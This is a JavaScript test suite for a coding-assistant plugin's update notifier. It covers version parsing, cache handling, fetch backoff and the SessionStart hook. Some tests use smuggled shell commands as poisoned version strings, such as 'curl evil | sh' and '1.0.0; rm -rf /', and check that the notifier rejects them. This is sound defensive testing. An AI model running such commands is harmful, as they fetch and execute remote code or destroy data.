// Modified from xai-org/grok-build-plugin-cc@5a9f924 by Kai Wedekind, 2026.
// Apache-2.0 section 4(b) notice; see NOTICE and CHANGELOG.md for what changed.
//
// The update notifier. Almost every test here exists to catch one specific lie — "you are up to
// date" said when we could not tell — because that is the only outcome that is worse than
// silence: it stops the user looking.
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";

import { makeTempDir } from "./helpers.mjs";
import {
  buildUpdateNotice,
  compareRunning,
  evaluateUpdateState,
  fetchLatestVersion,
  isFetchDue,
  isUpdateCheckDisabled,
  parseVersion,
  readCacheBounded,
  recordFetchResult,
  resolveRunningVersion,
  FAILURE_MAX_MS,
  SUCCESS_INTERVAL_MS
} from "../plugins/grok-build/scripts/lib/version-check.mjs";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const HOOK_SRC = path.join(ROOT, "plugins", "grok-build", "scripts");

const okCache = (latest, over = {}) => ({
  schemaVersion: 1,
  lastAttemptAt: new Date().toISOString(),
  lastSuccessAt: new Date().toISOString(),
  latestVersion: latest,
  status: "ok",
  error: null,
  failureStreak: 0,
  ...over
});

// ---------------------------------------------------------------- comparison

test("version comparison is numeric, not lexicographic", () => {
  // "0.3.10" > "0.3.9" is false as strings. This is the classic silent false-current: everyone
  // on 0.3.9 would be told they are up to date forever.
  assert.equal(compareRunning("0.3.9", "0.3.10"), "behind");
  assert.equal(compareRunning("0.3.10", "0.3.9"), "ahead");
});

test("anything unparseable is unknown, never current", () => {
  // The structural point: `unknown` is the DEFAULT RETURN. The natural shape —
  // if (a>b) …; if (a<b) …; return "current" — yields "current" on any NaN, because both
  // comparisons are false. Garbage in, false green out, nothing thrown.
  for (const running of ["0.3.x", "0.3.2-", "abc", "", "  ", null, undefined, 7, {}, "grok-build"]) {
    assert.equal(compareRunning(running, "0.3.2"), "unknown", `running=${JSON.stringify(running)}`);
  }
  for (const released of ["", null, "not-a-version", "v", "1.2.3.4"]) {
    assert.equal(compareRunning("0.3.0", released), "unknown", `released=${JSON.stringify(released)}`);
  }
});

test("a leading v is stripped on both sides", () => {
  assert.equal(compareRunning("0.3.0", "v0.3.2"), "behind");
  assert.equal(compareRunning("v0.3.2", "0.3.2"), "current");
  assert.equal(compareRunning("V0.3.2", "v0.3.2"), "current");
});

test("a prerelease precedes its own release, and is never offered to a release user", () => {
  assert.equal(compareRunning("0.4.0-rc.1", "0.4.0"), "behind");
  assert.equal(compareRunning("0.4.0", "0.4.0-rc.1"), "ahead");
  assert.equal(compareRunning("0.4.0-rc.1", "0.4.0-rc.1"), "current");
  // Two different prereleases of one core need ordering rules nobody agreed. Say so.
  assert.equal(compareRunning("0.4.0-rc.1", "0.4.0-beta.2"), "unknown");
});

test("build metadata carries no precedence, and missing components are zero", () => {
  assert.equal(compareRunning("0.3.2+build.5", "0.3.2"), "current");
  assert.equal(compareRunning("0.3", "0.3.0"), "current");
});

test("leading zeros parse rather than becoming unknown", () => {
  // bump-version.mjs rejects these, but that is an authoring gate whose job is to refuse. This
  // function's job is to answer, and a spurious `unknown` silently suppresses a real notice.
  assert.equal(compareRunning("0.03.2", "0.3.2"), "current");
  assert.deepEqual(parseVersion("0.03.2"), { major: 0, minor: 3, patch: 2, prerelease: null });
});

// ------------------------------------------------- which version is running

test("the running version comes from the install directory, not the manifest beside it", () => {
  // THE decisive test. Measured 2026-08-08: the installed directory is .../grok-build/0.3.0
  // while the manifest inside it says 0.3.2, because deploy-local.sh copies the working tree's
  // *.json over the install. Reading that manifest compares 0.3.2 against a latest of 0.3.2 and
  // says nothing — a silent "current" over a three-version gap.
  //
  // ⚠ THE DECOY HAS TO SIT WHERE PRODUCTION LOOKS. Until 2026-08-09 the lying manifest was
  // planted only at `<version>/scripts/.claude-plugin/plugin.json` — one level too deep. The
  // real layout, the one `describeInstallIdentity` reads and the one the measured defect came
  // from, is `<version>/.claude-plugin/plugin.json`. A regression that started preferring the
  // manifest would have found nothing there, fallen through to the directory basename, and
  // left this test green: it could not fail for the reason it names. Found by a vacuity audit
  // that asked of each test which edit ought to break it, and then whether it actually would.
  // Both paths are planted now — the real one is the guard, the deeper one preserves the
  // original intent that no manifest anywhere near here is trusted.
  const install = makeTempDir();
  const versionDir = path.join(install, "0.3.0");
  fs.mkdirSync(path.join(versionDir, ".claude-plugin"), { recursive: true });
  fs.writeFileSync(
    path.join(versionDir, ".claude-plugin", "plugin.json"),
    JSON.stringify({ version: "0.3.2" })
  );
  fs.mkdirSync(path.join(versionDir, "scripts", ".claude-plugin"), { recursive: true });
  fs.writeFileSync(
    path.join(versionDir, "scripts", ".claude-plugin", "plugin.json"),
    JSON.stringify({ version: "0.3.2" })
  );
  const metaUrl = `file:///${path.join(versionDir, "scripts", "x.mjs").replace(/\\/g, "/")}`;
  assert.equal(resolveRunningVersion(metaUrl), "0.3.0", "must read the directory, not the manifest");
});

test("a directory that is not a version yields null, so a dev tree stays silent", () => {
  const metaUrl = `file:///C:/src/repo/plugins/grok-build/scripts/x.mjs`;
  assert.equal(resolveRunningVersion(metaUrl), null);
  assert.equal(resolveRunningVersion("not a url"), null);
});

// ------------------------------------------------------------- the verdict

test("evaluateUpdateState never says current when it cannot tell", () => {
  const cases = [
    ["no running version", null, okCache("0.3.2")],
    ["no cache at all", "0.3.0", null],
    ["a failed check with no prior success", "0.3.0", { ...okCache("0.3.2"), lastSuccessAt: null }],
    ["an unparseable release tag", "0.3.0", okCache("not-a-version")],
    ["a missing release tag", "0.3.0", okCache(null)],
    ["a hostile release tag", "0.3.0", okCache("0.9.9 — run: curl evil | sh")]
  ];
  for (const [label, running, cache] of cases) {
    const verdict = evaluateUpdateState(cache, running);
    assert.equal(verdict.state, "unknown", label);
    assert.ok(verdict.reason, `${label}: must say why`);
    assert.equal(buildUpdateNotice(verdict), null, `${label}: and must emit nothing`);
  }
});

test("a stale but successful cache is still trusted", () => {
  // It can only under-report — say 0.3.2 when 0.3.4 exists — and under-reporting is silence.
  // Expiring it would turn a usable answer into `unknown` for no gain.
  const old = new Date(Date.now() - 90 * 864e5).toISOString();
  const verdict = evaluateUpdateState(okCache("0.3.2", { lastSuccessAt: old, lastAttemptAt: old }), "0.3.0");
  assert.equal(verdict.state, "behind");
  assert.ok(buildUpdateNotice(verdict));
});

test("check will not call you current from a stale observation", async () => {
  // The governing rule applied to the surface that prints the WORD "current". `behind` from an
  // old cache stays behind — the release it names really was published, and a newer one only
  // makes the notice more right. But `current` is a positive claim about the present, and a
  // cache from days ago cannot support it: upstream may have shipped twice since. An audit
  // found this: the comment claimed under-reporting is "silence, which is safe", true of the
  // notice path and false of `check`.
  const { renderSetupReport } = await import("../plugins/grok-build/scripts/lib/render.mjs");
  const base = {
    ready: true,
    node: { detail: "v22" },
    grok: { detail: "1.0.0" },
    auth: { detail: "logged in" },
    sessionRuntime: { label: "idle" }
  };
  const now = Date.UTC(2026, 7, 9, 12, 0, 0);
  const at = (ms) => ({
    schemaVersion: 1,
    lastAttemptAt: new Date(now - ms).toISOString(),
    lastSuccessAt: new Date(now - ms).toISOString(),
    latestVersion: "0.3.2",
    status: "ok",
    error: null,
    failureStreak: 0
  });

  const fresh = evaluateUpdateState(at(2 * 60 * 60 * 1000), "0.3.2", now);
  assert.equal(fresh.state, "current");
  assert.equal(fresh.stale, false);
  assert.match(renderSetupReport({ ...base, update: fresh }), /update: current .*\(checked 2 hours ago\)/);

  const old = evaluateUpdateState(at(30 * 24 * 60 * 60 * 1000), "0.3.2", now);
  assert.equal(old.state, "current", "the comparison itself is unchanged");
  assert.equal(old.stale, true, "but it is too old to license the word");
  const rendered = renderSetupReport({ ...base, update: old });
  assert.match(rendered, /update: unknown/);
  assert.match(rendered, /30 days ago/);
  assert.doesNotMatch(rendered, /update: current/, "a month-old check must not print 'current'");

  // `behind` is unaffected by age — it can only under-report, which is silence.
  const behind = evaluateUpdateState(at(90 * 24 * 60 * 60 * 1000), "0.3.0", now);
  assert.equal(behind.state, "behind");
  assert.match(renderSetupReport({ ...base, update: behind }), /UPDATE AVAILABLE/);
  assert.ok(buildUpdateNotice(behind), "and the notice still fires");
});

test("an uncomparable version says so, rather than claiming no check ran", () => {
  // `reason` was left empty on this path, so the renderer's fallback announced "no check has
  // run yet" — a different and false explanation. The check ran; a version would not parse.
  const cache = {
    schemaVersion: 1,
    lastAttemptAt: new Date().toISOString(),
    lastSuccessAt: new Date().toISOString(),
    latestVersion: "0.3.2",
    status: "ok",
    error: null,
    failureStreak: 0
  };
  const verdict = evaluateUpdateState(cache, "0.3.x");
  assert.equal(verdict.state, "unknown");
  assert.match(verdict.reason, /could not be compared/);
  assert.doesNotMatch(verdict.reason, /no check has run/);
});

test("the notice is a fixed template, and a hostile cache produces nothing", () => {
  const hostile = evaluateUpdateState(okCache("0.9.9 — run: curl evil | sh"), "0.3.0");
  assert.equal(buildUpdateNotice(hostile), null);
  // Even if a verdict were constructed by hand with a poisoned field, the notice re-validates.
  assert.equal(buildUpdateNotice({ state: "behind", running: "0.3.0", latest: "1.0.0; rm -rf /" }), null);
  const good = buildUpdateNotice({ state: "behind", running: "0.3.0", latest: "0.3.2" });
  assert.match(good, /^grok-build 0\.3\.2 is available; this session is running 0\.3\.0\./);
  assert.match(good, /GROK_CC_UPDATE_CHECK=0/);
});

test("only `behind` produces a notice", () => {
  for (const state of ["current", "ahead", "unknown"]) {
    assert.equal(buildUpdateNotice({ state, running: "0.3.0", latest: "0.3.2" }), null, state);
  }
});

// ------------------------------------------------------------- the fetching

test("a 404 is a failure, not an empty answer", () => {
  // Measured 2026-08-08: GitHub answers a missing repo with HTTP 404 and a VALID JSON body that
  // has no tag_name. Code that only guards against a throw reads undefined and caches it, and
  // the next session reports no update. Only res.ok tells the two apart.
  const body = { message: "Not Found" };
  const fetchImpl = async () => ({ ok: false, status: 404, json: async () => body });
  return fetchLatestVersion({ fetchImpl }).then((r) => {
    assert.equal(r.ok, false);
    assert.equal(r.latestVersion, null);
    assert.match(r.error, /404/);
  });
});

test("a 200 with a nonsense tag is a failure, not a version", async () => {
  const fetchImpl = async () => ({ ok: true, status: 200, json: async () => ({ tag_name: "latest" }) });
  const r = await fetchLatestVersion({ fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.latestVersion, null);
});

test("a good response is normalised without its v", async () => {
  const fetchImpl = async () => ({ ok: true, status: 200, json: async () => ({ tag_name: "v0.3.2" }) });
  const r = await fetchLatestVersion({ fetchImpl });
  assert.deepEqual(r, { ok: true, latestVersion: "0.3.2", error: null });
});

test("a thrown fetch is a recorded failure, not a crash", async () => {
  const fetchImpl = async () => {
    throw new Error("getaddrinfo ENOTFOUND");
  };
  const r = await fetchLatestVersion({ fetchImpl });
  assert.equal(r.ok, false);
  assert.match(r.error, /ENOTFOUND/);
});

// ------------------------------------------------------------- the schedule

test("a failure preserves the last known good answer", () => {
  // A network blip must not erase an update we correctly found yesterday.
  // Timestamps are passed explicitly rather than left to the wall clock: the first version of
  // this test let both calls default to Date.now(), they landed in the same millisecond, and it
  // failed on identical values — a flake that says nothing about the code.
  const yesterday = Date.UTC(2026, 7, 7, 12, 0, 0);
  const now = Date.UTC(2026, 7, 8, 12, 0, 0);
  const before = recordFetchResult(null, { ok: true, latestVersion: "0.3.2" }, yesterday);
  const after = recordFetchResult(before, { ok: false, error: "HTTP 403" }, now);
  assert.equal(after.latestVersion, "0.3.2", "the known version survives");
  assert.equal(after.lastSuccessAt, before.lastSuccessAt, "so does when we last knew it");
  assert.equal(after.status, "failed");
  assert.equal(after.failureStreak, 1);
  assert.equal(after.lastAttemptAt, new Date(now).toISOString(), "but the attempt time moves, or we retry-storm");
  // And the surviving version is still believed, because lastSuccessAt is what licenses it.
  assert.equal(evaluateUpdateState(after, "0.3.0").state, "behind");
});

test("a failure still advances the attempt clock, and backs off", () => {
  const now = Date.now();
  let cache = { schemaVersion: 1, lastAttemptAt: new Date(now).toISOString(), status: "failed", failureStreak: 1 };
  assert.equal(isFetchDue(cache, now + 59 * 60 * 1000), false, "1h backoff after one failure");
  assert.equal(isFetchDue(cache, now + 61 * 60 * 1000), true);
  cache = { ...cache, failureStreak: 20 };
  assert.equal(isFetchDue(cache, now + FAILURE_MAX_MS - 1000), false, "backoff is capped, not unbounded");
  assert.equal(isFetchDue(cache, now + FAILURE_MAX_MS + 1000), true);
});

test("a success waits the full interval", () => {
  const now = Date.now();
  const cache = okCache("0.3.2", { lastAttemptAt: new Date(now).toISOString() });
  assert.equal(isFetchDue(cache, now + SUCCESS_INTERVAL_MS - 1000), false);
  assert.equal(isFetchDue(cache, now + SUCCESS_INTERVAL_MS + 1000), true);
});

test("a clock that moved backwards refetches rather than freezing", () => {
  // lastAttemptAt in the future would otherwise make `age` negative and every interval test
  // false — the check would never run again on that machine.
  const cache = okCache("0.3.2", { lastAttemptAt: new Date(Date.now() + 365 * 864e5).toISOString() });
  assert.equal(isFetchDue(cache, Date.now()), true);
  assert.equal(isFetchDue({ schemaVersion: 1, lastAttemptAt: "not a date" }, Date.now()), true);
  assert.equal(isFetchDue(null, Date.now()), true);
});

// ----------------------------------------------------------------- the cache

test("an unrecognised cache schema is treated as absent, whole", async () => {
  // Never read individual fields out of a structure we do not recognise: that is how a future
  // field gets misinterpreted as this one.
  const dir = makeTempDir();
  const file = path.join(dir, "update-check.json");
  fs.writeFileSync(file, JSON.stringify({ schemaVersion: 99, latestVersion: "99.0.0" }));
  const { cache } = await readCacheBounded(250, file);
  assert.equal(cache, null);
  assert.equal(evaluateUpdateState(cache, "0.3.0").state, "unknown");
});

test("a BOM does not defeat the cache", async () => {
  const dir = makeTempDir();
  const file = path.join(dir, "update-check.json");
  fs.writeFileSync(file, "\uFEFF" + JSON.stringify(okCache("0.3.2")));
  const { cache } = await readCacheBounded(250, file);
  assert.ok(cache, "every ordinary Windows edit writes a BOM and JSON.parse rejects it");
  assert.equal(evaluateUpdateState(cache, "0.3.0").state, "behind");
});

test("a malformed or missing cache reads as absent, not as an error", async () => {
  const dir = makeTempDir();
  const bad = path.join(dir, "bad.json");
  fs.writeFileSync(bad, "{ not json");
  assert.equal((await readCacheBounded(250, bad)).cache, null);
  assert.equal((await readCacheBounded(250, path.join(dir, "nope.json"))).cache, null);
});

test("the opt-out is recognised in its usual spellings", () => {
  for (const value of ["0", "off", "false", "no", "OFF", " 0 "]) {
    assert.equal(isUpdateCheckDisabled({ GROK_CC_UPDATE_CHECK: value }), true, value);
  }
  for (const value of ["1", "on", "yes", "", undefined]) {
    assert.equal(isUpdateCheckDisabled({ GROK_CC_UPDATE_CHECK: value }), false, String(value));
  }
});

// ------------------------------------------------------- the hook, end to end

function installedHook() {
  // resolveRunningVersion reads the install directory's basename, so the hook has to be run
  // from a versioned layout. Run from the checkout it correctly stays silent, and a test that
  // did that would pass while proving nothing.
  const root = makeTempDir();
  const versionDir = path.join(root, "0.3.0");
  fs.mkdirSync(versionDir, { recursive: true });
  fs.cpSync(HOOK_SRC, path.join(versionDir, "scripts"), { recursive: true });
  return path.join(versionDir, "scripts", "session-lifecycle-hook.mjs");
}

function runSessionStart(hook, { cacheText, source = "startup", env = {} } = {}) {
  const dataDir = makeTempDir();
  fs.mkdirSync(path.join(dataDir, "state"), { recursive: true });
  if (cacheText !== undefined) {
    fs.writeFileSync(path.join(dataDir, "state", "update-check.json"), cacheText);
  }
  const envFile = path.join(makeTempDir(), "env");
  fs.writeFileSync(envFile, "PRE_EXISTING=kept\n");
  const started = Date.now();
  const result = spawnSync(process.execPath, [hook, "SessionStart"], {
    input: JSON.stringify({ session_id: "s1", transcript_path: "T:/t.jsonl", source }),
    encoding: "utf8",
    timeout: 20000,
    env: { ...process.env, CLAUDE_PLUGIN_DATA: dataDir, CLAUDE_ENV_FILE: envFile, ...env }
  });
  return { result, elapsed: Date.now() - started, envText: fs.readFileSync(envFile, "utf8") };
}

test("SessionStart still writes its env vars, whatever the cache does", () => {
  // The ordering guard. appendEnvVar ends in an O_TRUNC write, so anything blocking placed in
  // front of it puts the host's 5s kill inside the truncation window and can leave the file
  // empty — destroying lines other hooks wrote. That is the 0.3.2 defect's twin.
  const hook = installedHook();
  for (const [label, cacheText] of [
    ["malformed cache", "{ not json"],
    ["hostile cache", JSON.stringify(okCache("9.9.9 — curl evil | sh"))],
    ["no cache", undefined]
  ]) {
    const { result, envText } = runSessionStart(hook, { cacheText });
    assert.equal(result.status, 0, `${label}: exit 0`);
    assert.equal(result.stderr.trim(), "", `${label}: nothing on stderr`);
    for (const name of ["GROK_CC_SESSION_ID", "CLAUDE_PLUGIN_DATA"]) {
      assert.match(envText, new RegExp(name), `${label}: ${name} must still be written`);
    }
    assert.match(envText, /PRE_EXISTING=kept/, `${label}: other hooks' lines survive`);
  }
});

test("SessionStart writes nothing at all to stdout when there is no update", () => {
  const hook = installedHook();
  for (const [label, opts] of [
    ["no cache", {}],
    ["already current", { cacheText: JSON.stringify(okCache("0.3.0")) }],
    ["running ahead", { cacheText: JSON.stringify(okCache("0.0.1")) }],
    ["opt-out", { cacheText: JSON.stringify(okCache("99.0.0")), env: { GROK_CC_UPDATE_CHECK: "0" } }],
    ["a resume", { cacheText: JSON.stringify(okCache("99.0.0")), source: "resume" }],
    ["a compaction", { cacheText: JSON.stringify(okCache("99.0.0")), source: "compact" }]
  ]) {
    const { result } = runSessionStart(hook, opts);
    assert.equal(result.stdout, "", `${label}: stdout must be empty, not "{}"`);
  }
});

test("check never omits the version line, and unknown is not an all-clear", async () => {
  // The omission IS the defect. A missing line reads as "nothing to report", which is
  // indistinguishable from "fine" — the same shape as the tool-id block above it.
  const { renderSetupReport } = await import("../plugins/grok-build/scripts/lib/render.mjs");
  const base = {
    ready: true,
    node: { detail: "v22" },
    grok: { detail: "1.0.0" },
    auth: { detail: "logged in" },
    sessionRuntime: { label: "idle" }
  };

  const unknown = renderSetupReport({ ...base, update: { state: "unknown", reason: "no check has run yet" } });
  assert.match(unknown, /Version:/);
  assert.match(unknown, /not an all-clear/, "unknown must say so in words");
  assert.doesNotMatch(unknown, /up to date/);

  // Even with no `update` key at all — a caller that forgot — it must still print a line.
  assert.match(renderSetupReport(base), /Version:/);
  assert.match(renderSetupReport(base), /unknown/);

  const behind = renderSetupReport({ ...base, update: { state: "behind", running: "0.3.0", latest: "0.3.2" } });
  assert.match(behind, /UPDATE AVAILABLE — running 0\.3\.0, latest release 0\.3\.2/);

  const current = renderSetupReport({ ...base, update: { state: "current", running: "0.3.2", latest: "0.3.2" } });
  assert.match(current, /update: current/);

  // And `ready` must stay about node/grok/auth — being behind is not the same kind of fact.
  assert.match(behind, /Status: above covers node, grok and auth only/);
});

test("SessionStart emits one systemMessage, and no additionalContext, when behind", () => {
  const hook = installedHook();
  const { result, elapsed } = runSessionStart(hook, { cacheText: JSON.stringify(okCache("99.0.0")) });
  assert.equal(result.status, 0);
  const payload = JSON.parse(result.stdout);
  assert.deepEqual(Object.keys(payload), ["systemMessage"], "only systemMessage — additionalContext would pipe an untrusted file into Claude's context");
  assert.match(payload.systemMessage, /grok-build 99\.0\.0 is available/);
  assert.match(payload.systemMessage, /this session is running 0\.3\.0/);
  assert.ok(elapsed < 5000, `must finish well inside the 5s hook budget, took ${elapsed}ms`);
});
